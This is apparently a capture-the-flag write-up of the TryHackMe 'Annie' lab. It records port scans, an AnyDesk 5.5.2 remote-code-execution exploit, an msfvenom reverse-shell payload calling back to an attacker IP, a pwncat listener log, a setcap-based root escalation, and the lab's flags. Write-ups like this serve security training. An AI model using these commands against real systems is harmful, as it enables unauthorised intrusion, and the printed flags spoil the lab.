# Box Name

## Annie

## Overview
---
* [[#Enumeration]]

* [[#Initial Foothold]]

* [[#Privilege Escalation]]

---
## Enumeration
---
# nmap
```bash
rustscan -a 10.10.187.34 --ulimit 5000 -- -sCV -oN nmap/intial
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/scott/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.187.34:22
Open 10.10.187.34:7070
Open 10.10.187.34:40699
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

PORT      STATE SERVICE         REASON  VERSION
22/tcp    open  ssh             syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDA0R7eKVAIQzgsQ1QLoI7zzRYcaNBJ0wZtCbG1n5lR51Jfr2CC6+IVVxzleo0wCtfV9tcgtRXVdrju+29xaBR/Hin16MAf7QM4cY5dt46pgADnbwSXAy8GpnuCT10tTrL27gpKM2ayqmlpnKSxL2daP5uhkuoZCI3EYOvbaoPn4/u4vKeH64bk/s5zTE2JeIV/CwQnheYc1ZhwiJQD5k11735k+NfhD7pmhNY+QpG6qZNyFZ4APqdktrnDFetksOkC2NF4D8/OOjDsYkmofeIe+2fe01BHO4KFnRrKI3aSNDQdeNIQIL7LgKufgQ+yP0WmRLOThsiwu22jUG/8Ot1f
|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBH+EwC6q+M+qEr2TTccTtvcNF7dfougjgrZzZG4ShpTnNo1KXJy6iTnW/al9mxm/ecZVSF45w3Z3IYwAi9nfrdU=
|   256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBgcqbntpdHoH14/wXi5gysaIvv0hOk+VvCUNmVjhkMQ
7070/tcp  open  ssl/realserver? syn-ack
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AnyDesk Client
| Issuer: commonName=AnyDesk Client
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-23T20:04:30
| Not valid after:  2072-03-10T20:04:30
| MD5:   3e57 6c44 bf60 ef79 7999 8998 7c8d bdf0
| SHA-1: ce6c 79fb 669d 9b19 5382 8cec c8d5 50b6 2e36 475b
| -----BEGIN CERTIFICATE-----
| MIICqDCCAZACAQEwDQYJKoZIhvcNAQELBQAwGTEXMBUGA1UEAwwOQW55RGVzayBD
| bGllbnQwIBcNMjIwMzIzMjAwNDMwWhgPMjA3MjAzMTAyMDA0MzBaMBkxFzAVBgNV
| BAMMDkFueURlc2sgQ2xpZW50MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKC
| AQEAvFEAPxFPrh1v6FuKL9k1AiX5ml+soPQ3sfYSr+5y7uJlqwy2C6HZ2Kf83gc0
| MN/+GP4mWpB1LskMHDWf2173Sy8A+EBekxRn05tCs1gyxD19vHvqcorZD9JbN/Mz
| Pq6kEvloUrHNKgkYyYPq3neAZ4RxQSTjAOydR+0aGWiDV4QNdzmKvwaunlvz8zoZ
| Nr+tcI0UnP4jeAC3fSX7XfijPE7ANWaiwm4oVWOgiMXcTDGuJ78WptNJ7/XI+RFT
| lkN8T69uHWLRUyN2YHG7OSK28UExyDShM08t3MyztWQmCtHqQd4hExdZoIkIW9bP
| Qf4QS+mlal0rBYqNkZNXUNeX7QIDAQABMA0GCSqGSIb3DQEBCwUAA4IBAQBe68Tz
| 6xMMwAxJb0xWz7DIK9ffSVEnnBe3Epdi0a76B2I1eu59+DzZu1euw8UAak7i1lL/
| +Yu/i6LfLHzjQuD7MMQUmGRlcsxMTOfYXiSbKAgAd8vt+a24Q8LKDASu8lmLNtj/
| /GglirQnYStt6zb9f4Ud3YpPGDcqfS636YlnFDttmLMapI9GJZs+GTp+ukbxCH9j
| hrhMjE+4d1Le5dFk0K2P2v/m8IMqc52Mkef7XR4CFMC+DOIRp8U3PN1i9rFOLFaE
| FuZmniIJ30KAE+BCCPD+Ozx5cCcA8OYcT/Wyua5pPepP7ryR5lVbZmcAR9ELgzvm
| mSn9KWFRlhAMUQ4V
|_-----END CERTIFICATE-----
40699/tcp open  unknown         syn-ack
| fingerprint-strings: 
|   NULL: 
|     O;:#
|     psTC`BX
|     \x1d{
|     eF"w
|     }<?4
|     ?D;~
|     {P1M
|     L3[`
|     4|s@
|     SvY+L
|     \x0eLgYZ
|     3\x85
|     4Yoz
|     h{sA
|     \x99
|     \x07@
|     i^7e'O
|     ME\xd0
|_    uf7EE
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port40699-TCP:V=7.92%I=7%D=7/4%Time=62C2DF6D%P=x86_64-pc-linux-gnu%r(NU
SF:LL,FD2,"\x0f\xd0\xc2\xd8\xc1\xac\$\xc4\xa3\xf6{\^S\x02Q\x0f\xc2J\x10n\x
SF:cf\xfauK\xbc\x98\xfe\xdf\x08\xb8\xdc6/\xb7\xca\x9e\x81\x90XS\xe1\xbc\xc
SF:apH\xd1A\xbdf\x0eY\xe9\x17O;:#\xa6\xa3\xd70\xc0\x8c\x83\|\xbbB\xaa\nq\x
SF:12psTC`BX\xc1\xaa\x1dC\x9cB\xac\xcc\xa4r\xc4\xbb9\x117\"\xe3\x81\xb9\xe
SF:a\xa2\xbeS\xe6G\xe1O\x10\xad\x94\x04\"\xcb\x8d\x948\|\x81X\x20\x0e,;\xd
SF:a\xa7\xaa\xb5\|\xca\xa5\x14C\xdc\xda\\\x1d{\x9feF\"w\xa9\xcc\xc4\x821\x
SF:d9\x85\x98\xc6\xc7\xc6\|\xaf8\x9d\x8b\x85~G\|\n}<\?4\xdc\xf3\xc4\x88/\x
SF:81\xd0\xf6Tk\x0f\x99j\x1e\xbap\x82U\r\xa2\x80\x93\$\xa9\xb5>\xb7\xed\xe
SF:2\x91b\xacd\xb9\xe7X\xaa\x18h\xcfFW\.\xb6\x8d\xf1\x9b\xa2\xc6\xb5\x04a\
SF:x08\x14\xc0\xf8\x0f\?\xd4\xa2\xa5\xfb\?D;~\xc1\x92{P1M\x13\x03F\xf8MnM\
SF:xac\xf1W\xfd\x1eG\)\xb2\xe1\x94\xfe5x\xcfA\xe6\xe8=\x89\xfb\xcf\xb6\$\x
SF:ff\xe3}r0\xd3\xb3\xa5\xa3\xc7i\x17\xdc\x8a\xf8\xca\xc0\x04\|\xfbR\x1b\x
SF:87\xa7\x01\xdcN\xe9\xba\xe8\xf1l\xfd\|F@\xfa\xef\x10\xab`\xb8\xe8\xbdVU
SF:\xfc\x89\xaf1\xb7L3\[`\xf64\|s@\x15\xd5\x99\xc5K\xa3\xcd\x1a6\x9b\x8a\x
SF:96\xe4\x02\x9e\(#\x990y\xf5\n;\xdcSvY\+L\x15\)Y\x80\x9e\xd1\xf1T\x88\xe
SF:7\xb8\\\x0eLgYZ\x02\x1d\x93\.\x89\x1a\x12'&\xa5\x9a\x0bL6\xe6\x8a\]\xf5
SF:\x9bP\x84\x8b4\xbe!\^\x8d\x1b\x1b4\x02NG\x16\x1e\x8f\x9b\x83\xe3\xc3\xd
SF:2\xc7\x9b\$\xb3X\xf7\x825\.\xe9\xf0`\x9a6o\xd8\xa9\x1b\xbcYt\xeep\x86Z\
SF:xf2b\x97c\]\xb6\x84\xa7C\xe1Q1\x80\x96\xcbU\xde\xb1\xad\?7\x87\x82\xa3\
SF:xdfe\r3\\\x85\x89E\*\[\x82%m\xe1\xd9\xe6\xc8\x0fG\xbc\xd2\x81\xb17\xba\
SF:xa7J\(\xf0\xa4r\x86\xccMF\x9d\x8928\xbd\xf8x\|\xca\x87&\xa5\0EF1\x98\xf
SF:d\x8b\|\xd4\xec\x80x\x99B\xae\[\x94\xe3\x8a\xfbN\x06\xdaW\xb4\xbe\x18s\
SF:xde\x04U\xa8\xbf\x95`\xdd\xc0\xb3\xcfW\x9d\x94\x07\x19-\xd14Yoz\xef\xaf
SF:\x8c%\xd1\x11\x81\x01\xacaFZ\xbd\|\"\xb4B\xe4\x1a\x12\)\x9d\x8b\xe3\x0f
SF:\xde\xd7\xfb\x05\x11f\x81\xd5\xb1!\x07\x92<\x8a\*\xc2\x05\x03\x13\x19\x
SF:c6\x0b\x15\xf8\xb7\x81r\n\xdc\xa48X\xbd\xc5\xd8\xbdp\x97\xcb\x81\x8d\xc
SF:0\xa2\x8c\xf9\x82\r\x02I\x19\xb3\(\xf8\x1e\x8b\xe2\xa0R\x9clBU\x1aJ\xd3
SF:\xbc7\xf4\xa0\xb6\x01h{sA\xaf\xc1\x81\xf8\xde\xc6\x8c\"#0\x135<2\x05\x9
SF:4\x05d\r\0\xa5\xbb_\xde\\\x99\xfeq\xab\\\x07@\xf1p\xc4\xa1\xda\x08~\x8a
SF:\xa9\^\x16\xf9\x07&\xecq\xfd\x01N\xc1\x20y\xb3\xfd\xd9\x1cP\xfcV\xbdX\x
SF:16i\^7e'O\x13\x16\xb3`\x10\xe2\xfco6\xd5'\xd5\x08\xf05\x1bc\x8b\\8\x9f3
SF:j\xb8&\^\xf1\x1b\0\xc2\xb9\x1d}\xa4\xa5\xaeR\xf1\xca\xb5\xd8M\xf8\x83\x
SF:fe\x186\xc6\xe5\xe9\xdd\xfc\x8a\xc5\$\xa2q\xbbEU\xdb\x9b\xaeME\\\xd0\xf
SF:0j\xe3\xd5\xd8@p\x1f\xf0_2\xaff\x0b\xbak\xae\0H\xe5\xf3\+\x0f\xa4\xc8o\
SF:xa4:\x13\x16\+e\x0b0\x968\$o\xaf\x1a\x93\xa0\xd8\xa2\x07\xc3\xb8\x93\xa
SF:3\xfap\xb6\xbeN\x9c\xd0<6\x86D\xc2\xa2\xc8\x98X/\xc6\xcd\x17\x20\xf6\x9
SF:8\xeeH\xe2%\0w\]_\xb0\x9e\x15C\xec\x10\xe9\xf3uf7EE\x97\xef0\xddh\x1b\x
SF:20i\xb4\(");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

 ## searchsploit
 ```bash
  searchsploit AnyDesk                 
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
AnyDesk 2.5.0 - Unquoted Service Path Privilege Escalation                        | windows/local/40410.txt
AnyDesk 5.4.0 - Unquoted Service Path                                             | windows/local/47883.txt
AnyDesk 5.5.2 - Remote Code Execution                                             | linux/remote/49613.py
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```


## Initial Foothold
---
 ### AnyDesk 5.5.2 exploit to get [[revshell]]
  - created shellcode with msfvenom
	  - msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.13.13.55 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
	  - modified python exploit script 
	  - executed python scrip got shell using pwncat
```
	pwncat-cs -lp 4444
	[08:13:54] Welcome to pwncat 🐈!                                                                      __main__.py:164
	[08:15:38] received connection from 10.10.79.205:39914                                                     bind.py:84
	[08:15:42] 0.0.0.0:4444: upgrading from /bin/dash to /bin/bash                                         manager.py:957
	[08:15:44] 10.10.79.205:39914: registered new host w/ db                                               manager.py:957
	(local) pwncat$                                                                                                      
	(remote) annie@desktop:/home/annie$
	
```



---
## Privilege Escalation
----
 ## suid bit binaries
 - searched for suid bit binaries
```bash
(remote) annie@desktop:/home/annie$ find / -perm -4000 2>/dev/null
/sbin/setcap <== "unusual"
/bin/mount
/bin/ping
/bin/su
/bin/fusermount
/bin/umount
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/arping
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec


```

- using setcap was able to set suid bit on python
```bash
(remote) annie@desktop:/home/annie$ /sbin/setcap cap_setuid+ep /usr/bin/python3.6
(remote) annie@desktop:/home/annie$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@desktop:/home/annie# 

```

```bash

root@desktop:/home/annie# cat user.txt /root/root.txt
THM{N0t_Ju5t_ANY_D3sk}
THM{0nly_th3m_5.5.2_D3sk}
root@desktop:/home/annie# 
```